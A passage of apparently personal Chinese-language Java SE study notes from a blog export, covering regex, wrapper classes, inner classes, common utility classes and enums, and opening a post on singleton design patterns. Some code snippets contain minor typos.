<p>4、分组：（.）\1+(..)\2（重复3次及以上要加上+）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String regex7=<span class="string">&quot;(\\d+)([a-z]&#123;3&#125;)\\1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​    去同:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String ss1=s.replaceAll(<span class="string">&quot;(.)\\1+&quot;</span>,<span class="string">&quot;$1&quot;</span>);</span><br><span class="line">String regex10=<span class="string">&quot;(..)\\1&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;恭喜恭喜&quot;</span>.matches(regex10));</span><br><span class="line">String regex11=<span class="string">&quot;(.)\\1+(.)\\2(.)\\3(..)\\4+&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;开开开心心年年开心开心开心&quot;</span>.matches(regex11));</span><br></pre></td></tr></table></figure>

<p>5、获取 Pattern p=pattern.compile(regex)获取正则表达式</p>
<p>​               Mather m=p.matcher(s) 获取匹配器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern p=Pattern.compile(regex12); <span class="comment">//获取正则表达式</span></span><br><span class="line">Matcher m=p.matcher(str1);  <span class="comment">//获取匹配器</span></span><br><span class="line"><span class="keyword">while</span> (m.find())&#123;</span><br><span class="line">    System.out.println(m.group());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">boolean</span> b=m.matches();</span><br></pre></td></tr></table></figure>



<h3 id="四、包装类"><a href="#四、包装类" class="headerlink" title="四、包装类"></a>四、包装类</h3><p>包装类：Integer Character Double 引用类型              </p>
<p>装箱：基本类型–&gt;引用类型</p>
<p>拆箱：引用类型–&gt;基本类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line">Integer i=<span class="keyword">new</span> Integer(<span class="number">5</span>);</span><br><span class="line">Integer i1=<span class="keyword">new</span> Integer(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">Integer i1=Integer.valueOf(<span class="number">5</span>);        <span class="comment">//装箱</span></span><br><span class="line"><span class="keyword">int</span> i3=i1.intValue()                  <span class="comment">//拆箱</span></span><br><span class="line">    </span><br><span class="line">nteger i=<span class="number">5</span>; <span class="comment">//自动装箱</span></span><br><span class="line"><span class="keyword">int</span> i1=i;	<span class="comment">//自动拆箱</span></span><br><span class="line"><span class="keyword">int</span> i2=i+<span class="number">100</span>;</span><br><span class="line">System.out.println(i2);     <span class="comment">//105</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//int--&gt;String</span></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">10</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;&quot;</span>+num);<span class="comment">//字符串拼接</span></span><br><span class="line"></span><br><span class="line">String s=String.valueOf(num);</span><br><span class="line">System.out.println(s);      <span class="comment">//调用string类的valueOf()</span></span><br><span class="line"></span><br><span class="line">Integer i2=<span class="keyword">new</span> Integer(num);              <span class="comment">// Integer构造器</span></span><br><span class="line">System.out.println(i2.toString());      <span class="comment">//int--&gt;integer--&gt;String</span></span><br><span class="line"></span><br><span class="line">System.out.println(Integer.toString(num)); <span class="comment">//Integer的toString()方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//String--&gt;int</span></span><br><span class="line">String str=<span class="string">&quot;100&quot;</span>;</span><br><span class="line">System.out.println(Integer.parseInt(str));  <span class="comment">//调用Integer的parseInt()方法</span></span><br><span class="line"></span><br><span class="line">Integer i3=<span class="keyword">new</span> Integer(str);</span><br><span class="line">System.out.println(i3.intValue()); <span class="comment">//String--&gt;integer--&gt;int</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20200729202311075.png" alt="image-20200729202311075"></p>
<p><img src="https://csn.damyoung.cn/image-20200729202326200.png" alt="image-20200729202326200"></p>
<h3 id="五、内部类"><a href="#五、内部类" class="headerlink" title="五、内部类"></a>五、内部类</h3><blockquote>
<p><strong>任何内部类都可以编译成独立的class文件</strong></p>
</blockquote>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200729202345324.png" alt="image-20200729202345324"></p>
<p><img src="https://csn.damyoung.cn/image-20200729202405293.png" alt="image-20200729202405293"></p>
<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20200729202414378.png" alt="image-20200729202414378"></p>
<p><img src="https://csn.damyoung.cn/image-20200729202419358.png" alt="image-20200729202419358"></p>
<h4 id="1、成员内部类"><a href="#1、成员内部类" class="headerlink" title="1、成员内部类"></a>1、成员内部类</h4><p>（1）内部类，可以访问外部类所有私有属性和私有方法</p>
<p>（2）外部类方法使用时，需要创建内部类对象</p>
<p>（3）其他类访问：Outer.Inner inner=new Outer().new Inner();</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">30</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">40</span>;</span><br><span class="line">        System.out.println(num);    <span class="comment">//局部变量 40</span></span><br><span class="line">        System.out.println(<span class="keyword">this</span>.num);   <span class="comment">//内部类属性30</span></span><br><span class="line">        System.out.println(Outer.<span class="keyword">this</span>.num); <span class="comment">//外部类属性,有重名变量时需要这样写</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;内部类第二个方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用成员内部类</span></span><br><span class="line">Outer.Inner inner=<span class="keyword">new</span> Outer().<span class="function">new <span class="title">Inner</span><span class="params">()</span></span>;</span><br><span class="line">inner.method2();</span><br></pre></td></tr></table></figure>

<h4 id="2、局部内部类"><a href="#2、局部内部类" class="headerlink" title="2、局部内部类"></a>2、局部内部类</h4><p>​    （在方法里面）:方法里面==局部变量，<strong>不能在方法外使用</strong></p>
<p>​    可以共享局部变量，但局部变量必须是final修饰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span></span>&#123;</span><br><span class="line"><span class="comment">//局部内部类</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inner2</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">print1</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;局部内部类&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Inner2 inner2=<span class="keyword">new</span> Inner2();</span><br><span class="line">    inner2.print1();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、静态内部类"><a href="#3、静态内部类" class="headerlink" title="3、静态内部类"></a>3、静态内部类</h4><p> 1、静态内部类可以调用外部类静态方法</p>
<p>  2、其他类调用内部类静态方法:外部类.内部类.静态方法()</p>
<p>​        Outer.Inner inner=new Outer.Inner();</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//静态内部类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner1</span></span>&#123;</span><br><span class="line">    <span class="comment">//只能调用外部类的静态成员</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态内部类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、匿名内部类"><a href="#4、匿名内部类" class="headerlink" title="4、匿名内部类"></a>4、匿名内部类</h4><p>​        匿名内部类:使用于 抽象方法和接口</p>
<p>​        接口有多个抽象方法就用有名内部类  Interface interface=new Interface(){}; interface.print();</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Niming</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer3</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//匿名内部类</span></span><br><span class="line">        Niming aa=<span class="keyword">new</span> Niming()&#123;   <span class="comment">//匿名对象</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名方法1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;匿名方法2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        aa.print1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="六、Random类"><a href="#六、Random类" class="headerlink" title="六、Random类"></a>六、Random类</h3><img src="https://csn.damyoung.cn/image-20200729202441171.png" alt="image-20200729202441171"  />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不带参构造</span></span><br><span class="line">Random r=<span class="keyword">new</span> Random();</span><br><span class="line"><span class="keyword">int</span> a=r.nextInt(<span class="number">10</span>);<span class="comment">//0-10随机数整数，不包含10</span></span><br><span class="line">System.out.println(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//带参构造</span></span><br><span class="line">Random r1=<span class="keyword">new</span> Random(<span class="number">10</span>);</span><br><span class="line">Random r2=<span class="keyword">new</span> Random(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> a1=r1.nextInt(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> a2=r2.nextInt(<span class="number">10</span>);</span><br><span class="line">System.out.println(a1+<span class="string">&quot;    &quot;</span>+a2);</span><br></pre></td></tr></table></figure>

<h3 id="七、Math类"><a href="#七、Math类" class="headerlink" title="七、Math类"></a>七、Math类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//开根</span></span><br><span class="line">Math.sqrt(<span class="number">5</span>);</span><br><span class="line"><span class="comment">//绝对值</span></span><br><span class="line">Math.abs(-<span class="number">1</span>);</span><br><span class="line"><span class="comment">//向上取整，向下取整</span></span><br><span class="line">Math.ceil(<span class="number">5.5</span>);</span><br><span class="line">Math.floor(<span class="number">6.5</span>);</span><br><span class="line"><span class="comment">//PI</span></span><br><span class="line">System.out.println(Math.PI);</span><br><span class="line"><span class="comment">//幂次</span></span><br><span class="line">System.out.println(Math.pow(<span class="number">5</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">//获取俩数最大值</span></span><br><span class="line">Math.max(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"><span class="comment">//四舍五入</span></span><br><span class="line">Math.round(<span class="number">5.5</span>);</span><br><span class="line"><span class="comment">//包括0，不包括1.0</span></span><br><span class="line">System.out.println(Math.floor((Math.random()*<span class="number">100</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="八、日期类"><a href="#八、日期类" class="headerlink" title="八、日期类"></a>八、日期类</h3><h4 id="1、Date"><a href="#1、Date" class="headerlink" title="1、Date"></a>1、Date</h4><h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>（1）无参：获取当前时间。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Date d=<span class="keyword">new</span> Date();</span><br><span class="line">System.out.println(d);	</span><br><span class="line"><span class="comment">//date类重写了toString方法，Thu Jul 30 10:22:54 CST 2020</span></span><br></pre></td></tr></table></figure>

<p>（2）有参：new Date(毫秒数)    //传入毫秒数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Date d1=<span class="keyword">new</span> Date(num1);</span><br></pre></td></tr></table></figure>

<h5 id="普通方法"><a href="#普通方法" class="headerlink" title="普通方法"></a>普通方法</h5><p>toString() 转化为时间格式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(d.toString());<span class="comment">//Thu Jul 30 10:22:54 CST 2020</span></span><br><span class="line">System.out.println(d.toLocaleString());  <span class="comment">//2020-7-30 10:22:54</span></span><br></pre></td></tr></table></figure>

<p>getTime() 1970至今的毫秒数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> num=d.getTime();</span><br></pre></td></tr></table></figure>

<p>getYear() 1900年—&gt;+1970    </p>
<p>getMonth()–&gt;+1</p>
<p>setTime() 传入毫秒数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">d2.setTime(num1);</span><br></pre></td></tr></table></figure>

<h4 id="2、DateFormat"><a href="#2、DateFormat" class="headerlink" title="2、DateFormat"></a>2、DateFormat</h4><p>​        <strong>字符串和时间互相转化</strong></p>
<h5 id="2-1-format"><a href="#2-1-format" class="headerlink" title="2.1 format()"></a>2.1 format()</h5><p>​            将date对象转化为String对象（具有规定格式）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SimpleDateFormat d=<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy/MM/dd hh:mm:ss&quot;</span>);</span><br><span class="line"><span class="comment">//时间对象转化规定格式的字符串</span></span><br><span class="line">String s=d.format(date);</span><br></pre></td></tr></table></figure>

<h5 id="2-2-parse"><a href="#2-2-parse" class="headerlink" title="2.2 parse()"></a>2.2 parse()</h5><p>​            将字符串转化为date</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SimpleDateFormat d1=<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy/MM/dd&quot;</span>);</span><br><span class="line">Date date1=d1.parse(s1);</span><br></pre></td></tr></table></figure>

<h4 id="3、Calendar"><a href="#3、Calendar" class="headerlink" title="3、Calendar"></a>3、Calendar</h4><p>​        <strong>抽象类,不能被实例化</strong></p>
<p>​        获取实例对象: Calendar ca=Calendar.getInstance(); </p>
<p>​        get(Calendar.***);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ca.get(Calendar.DAY_OF_MONTH);</span><br><span class="line">ca.get(Calendar.YEAR);</span><br></pre></td></tr></table></figure>

<p>​        add(Calendar.***,-1);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ca.add(Calendar.YEAR,-<span class="number">1</span>); <span class="comment">//去年的年份</span></span><br></pre></td></tr></table></figure>

<p>​        set( );</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ca.set(<span class="number">2018</span>,<span class="number">7</span>,<span class="number">14</span>);</span><br></pre></td></tr></table></figure>

<h4 id="4、date与calendar互相转化"><a href="#4、date与calendar互相转化" class="headerlink" title="4、date与calendar互相转化"></a>4、date与calendar互相转化</h4><blockquote>
<p>调用calendar的get/set方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Date date=<span class="keyword">new</span> Date();</span><br><span class="line">Calendar ca=Calendar.getInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//date--&gt;calendar</span></span><br><span class="line">ca.setTime(date);</span><br><span class="line">System.out.println(ca.get(Calendar.YEAR));</span><br><span class="line"></span><br><span class="line"><span class="comment">//calendar--&gt;date</span></span><br><span class="line">Date date1=ca.getTime();</span><br><span class="line">System.out.println(date1.toLocaleString());</span><br></pre></td></tr></table></figure>

<h3 id="九、Object"><a href="#九、Object" class="headerlink" title="九、Object"></a>九、Object</h3><p>所有类的父类，故Object类可以接收全部类的对象（数组和接口也行），因为可以向上转型</p>
<p>hashCode()地址、getClass()返回类名（class类中getName方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getClass方法</span></span><br><span class="line">String s=s1.getClass().getName();</span><br><span class="line">System.out.println(s);</span><br></pre></td></tr></table></figure>

<p>toString():类名+@+hashcode十六进制码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//toString方法</span></span><br><span class="line">System.out.println(s1.toString());</span><br><span class="line">System.out.println(s1);     <span class="comment">//默认调用toString方法</span></span><br><span class="line">System.out.println(Integer.toHexString(s1.hashCode())); <span class="comment">//将hashcode地址值转化为十六进制</span></span><br></pre></td></tr></table></figure>

<p>equals()比较地址</p>
<p>//<strong>重写了hashcode、equals方法</strong>，使返回值和属性挂钩</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//equals() 比较引用类型是地址，字符串是值</span></span><br><span class="line"><span class="comment">//String类重写了equals方法，equals比较的是内容</span></span><br><span class="line">MyObject m1=<span class="keyword">new</span> MyObject();</span><br><span class="line">MyObject m2=<span class="keyword">new</span> MyObject();</span><br><span class="line">MyObject m3=m1;</span><br><span class="line">System.out.println(m1.equals(m2));  <span class="comment">//false</span></span><br><span class="line">System.out.println(m1.equals(m3));  <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h3 id="十、System"><a href="#十、System" class="headerlink" title="十、System"></a>十、System</h3><p>包含一些有用的类字段和方法，不能被实例化</p>
<p>System.gc():运行垃圾回收(通知作用)</p>
<p>System.exit():终止当前正在运行的jvm。写0表示自动退出，写其他意外退出</p>
<p>System.currentTimeMills():获取当前时间的毫秒值</p>
<p>arraycopy():    数组拷贝(覆盖目标数组的值)</p>
<p>​                        src:原数组 srcPos:拷贝开始位置</p>
<p>​                        dest：目标数组 destPos:从什么位置开始赋值</p>
<p>​                        length:一次拷贝多少个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a=&#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] a1=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">System.arraycopy(a,<span class="number">0</span>,a1,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">System.out.println(Arrays.toString(a1));</span><br></pre></td></tr></table></figure>

<h3 id="十一、Arrays"><a href="#十一、Arrays" class="headerlink" title="十一、Arrays"></a>十一、Arrays</h3><p>​     1、Arrays.toString 将数组转化为字符串形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> []arr=<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">22</span>,<span class="number">66</span>,<span class="number">66</span>,<span class="number">85</span>,<span class="number">99</span>,<span class="number">100</span>&#125;;</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br></pre></td></tr></table></figure>

<p>​     2、Arrays.equals（a，b） 判断俩个数组是否相同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//比较数组相等</span></span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">boolean</span> is=Arrays.equals(a,b);</span><br><span class="line">System.out.println(is);</span><br></pre></td></tr></table></figure>

<p>​     3、Arrays.sort(a)  数组排序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//排序</span></span><br><span class="line">Arrays.sort(arr);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br></pre></td></tr></table></figure>

<p>​     4、Arrays.fill(arr,3)  将数组所有元素覆盖成3</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//覆盖数组</span></span><br><span class="line">Arrays.fill(arr,<span class="number">2</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br></pre></td></tr></table></figure>

<p>​      5、Arrays.copyOf(arr,4)  拷贝数组，长度为4</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拷贝</span></span><br><span class="line"><span class="keyword">int</span> []a1=&#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">56</span>,<span class="number">66</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> []b1=Arrays.copyOf(a1,<span class="number">2</span>);</span><br><span class="line">System.out.println(Arrays.toString(b1));</span><br></pre></td></tr></table></figure>

<p>​      6、Arrays.binarySearch(a,3)  查找数组是否有3这个元素</p>
<p>​            使用二分搜索法查询元素值val在数组array中的索引，返回要搜索元素的索引值，如果没找到，如果目标值不在数组内的，返回 -（第一个大于目标值的元素的下标+1），类似的，如果数组内的值都比目标值小，则是返回-（数组长度+1）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(Arrays.binarySearch(arr,<span class="number">99</span>));</span><br></pre></td></tr></table></figure>

<h3 id="十二、枚举类"><a href="#十二、枚举类" class="headerlink" title="十二、枚举类"></a>十二、枚举类</h3><p>特殊的类（春夏秋冬（有限的对象））</p>
<p>​          构造方法为private，只能在构造枚举对象时使用</p>
<p>​          默认（public static final）,枚举只能在第一行显示列出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Gender</span></span>&#123;</span><br><span class="line">    MALE,FEMALE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Gender gender=Gender.MALE;</span><br><span class="line">System.out.println(<span class="string">&quot;性别&quot;</span>+Gender.MALE);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式</title>
    <url>/2020/08/11/05%E5%B8%B8%E8%A7%81%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="一、创建型模式"><a href="#一、创建型模式" class="headerlink" title="一、创建型模式"></a>一、创建型模式</h2><h3 id="1、单例模式"><a href="#1、单例模式" class="headerlink" title="1、单例模式"></a><strong>1</strong>、单例模式</h3><p>Singleton</p>
<blockquote>
<p>一个类只有一个实例，且该类能自行创建这个实例的一种模式</p>
</blockquote>
<p><strong>特点</strong></p>
<blockquote>
<ul>
<li>私有的构造方法，外部不能直接创建该类的实例</li>
</ul>
</blockquote>
<p><strong>应用</strong></p>
<blockquote>
<ul>
<li>某类只要求生成一个对象，对象需要被共享的场合</li>
<li>当某类需要频繁实例化，而创建的对象又频繁被销毁的时候</li>
</ul>
<p>​    如多线程的线程池、tomcat连接池等</p>
</blockquote>
<h4 id="1-1-懒汉式"><a href="#1-1-懒汉式" class="headerlink" title="1.1 懒汉式"></a>1.1 懒汉式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Lhan</span></span>&#123;</span><br><span class="line">    <span class="comment">//私有的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Lhan</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Lhan instance=<span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Lhan <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//balking模式</span></span><br><span class="line">        <span class="keyword">if</span>(instance!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">        instance=<span class="keyword">new</span> Lhan();</span><br><span class="line">        returen instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>多次调用都会调用Synchronized锁，性能较低。</li>
</ul>
<h4 id="1-2-饿汉式"><a href="#1-2-饿汉式" class="headerlink" title="1.2 饿汉式"></a>1.2 饿汉式</h4><blockquote>
<p>实例在初始化的时候已经创建，<strong>JVM在加载类的时候是单线程的，由于实例被static修饰</strong>，故没有线程安全的问题</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Ehan</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">//私有的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Ehan</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Lhan instance=<span class="keyword">new</span> Ehan();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Ehan <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        returen instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//防止反序列化破坏单例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>final–防止子类继承覆盖，破坏单例</li>
<li>构造方法私有，防止创建新的实例，但不能防止反射创建新的实例</li>
<li>static修饰在加载类时创建，JVM在加载类的时候是单线程，可以保证是线程安全的。</li>
<li><strong>方法封装提供一些懒惰的初始化，提供泛型的支持</strong></li>
</ul>
<h4 id="1-3-双检锁式"><a href="#1-3-双检锁式" class="headerlink" title="1.3 双检锁式"></a>1.3 双检锁式</h4><blockquote>
<p>特点是在synchronized关键字内外都加了一层 if 条件判断</p>
<p>既保证了线程安全，又比直接上锁提高了执行效率，还节省了内存空间</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="comment">//私有的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Lhan</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance=<span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton.class)&#123;</span><br><span class="line">                <span class="comment">//防止并发下，单例对象不会被重复创建。</span></span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="comment">//当t1到达这里，未实例化null</span></span><br><span class="line">                    instance=<span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>双重if，防止并发条件下，单例对象不会被重复创建。</li>
</ul>
<h4 id="1-4-静态内部类"><a href="#1-4-静态内部类" class="headerlink" title="1.4 静态内部类"></a>1.4 静态内部类</h4><blockquote>
<p>实例化设置为静态内部类的一个静态属性。</p>
<p>只适用于静态域的情况，双检锁方式可在实例域需要延迟初始化时使用。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE=<span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第一次使用时，才会触发类加载操作的，故属于懒汉式</p>
</li>
<li><p>类加载时JVM是单线程的，无线程安全问题。</p>
</li>
</ul>
<h4 id="1-5-枚举单例"><a href="#1-5-枚举单例" class="headerlink" title="1.5 枚举单例"></a>1.5 枚举单例</h4><blockquote>
<p>可为饿汉式的改进</p>
<p>自动支持序列化机制，绝对防止多次实例化。</p>
